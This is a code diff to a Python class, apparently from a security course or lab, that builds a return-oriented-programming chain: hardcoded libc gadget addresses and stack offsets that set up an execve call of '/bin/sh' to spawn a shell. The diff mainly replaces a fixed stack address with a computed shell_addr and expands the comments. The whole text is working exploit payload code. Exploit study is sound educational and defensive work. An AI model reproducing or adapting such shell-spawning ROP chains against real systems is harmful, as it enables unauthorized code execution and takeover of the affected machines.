@@ -46,25 +46,29 @@ class GenerateShellcode:
         self.store_word(int(hex_str, 16))
 
     def get_shellcode(self):
-        # TODO(samanthayu): Use libc offset
-        self.store_word(0xb7e3579c)  # xor eax, eax ; ret ;
-        self.store_word(0xb7e34c6c)  # pop ecx ; pop edx ; ret ;
+        # TODO(samanthayu): Use libc offset and shell_addr
+        shell_addr = 0xbffffbb0 + 0x34
+
+        self.store_word(0xb7e3579c)     # xor eax, eax ; ret ;
+        self.store_word(0xb7e34c6c)     # pop ecx ; pop edx ; ret ;
         self.store_word(0x0b0b0b0b)
-        self.store_word(0xbfffee24 - 0x4 - 0x18)  # Point to zero word - 0x18f
+        self.store_word(shell_addr - 0x4 - 0x18)  # Point to zero word - 0x18
 
-        self.store_word(0xb7e34ca3)  # mov dword ptr [edx + 0x18], eax ; ret ;
-        self.store_word(0xb7e688a7)  # add al, ch ; ret ;
+        self.store_word(0xb7e34ca3)     # mov dword ptr [edx + 0x18], eax ; ret ;
+                                        # - Update 0xdecafbad to 0
+        self.store_word(0xb7e688a7)     # add al, ch ; ret ;
+                                        # - Set eax to just 0x0b
 
-        self.store_word(0xb7ef11c8)  # pop ebx ; ret ;
-        self.store_word(0xbfffee24)  # Point to "/bin/sh"
-        self.store_word(0xb7e34c6c)  # pop ecx ; pop edx ; ret ;
-        self.store_word(0xbfffee24 - 0x8)  # Point to address of the argv array
-        self.store_word(0xbfffee24 - 0x4)  # Point to address of the envp array
+        self.store_word(0xb7ef11c8)     # pop ebx ; ret ;
+        self.store_word(shell_addr)     # Point to "/bin/sh"
+        self.store_word(0xb7e34c6c)     # pop ecx ; pop edx ; ret ;
+        self.store_word(shell_addr - 0x8)   # Point to address of the argv array
+        self.store_word(shell_addr - 0x4)   # Point to address of the envp array
 
-        self.store_word(0xb7eba265)  # call dword ptr gs:[0x10] ; ret ;
-        self.store_word(0xbfffee24 - 0x4)
-        self.store_word(0xdecafbad)  # Temporary value which will get replaced with 0 with 0xb7e34ca3 gadget
-        self.store_str("/bin")  # 0xbfffee24
+        self.store_word(0xb7eba265)     # call dword ptr gs:[0x10] ; ret ;
+        self.store_word(shell_addr - 0x4)
+        self.store_word(0xdecafbad)     # Temporary value that will get replaced with 0 by the 0xb7e34ca3 gadget
+        self.store_str("/bin")
         self.store_str("/sh\0")
 
 
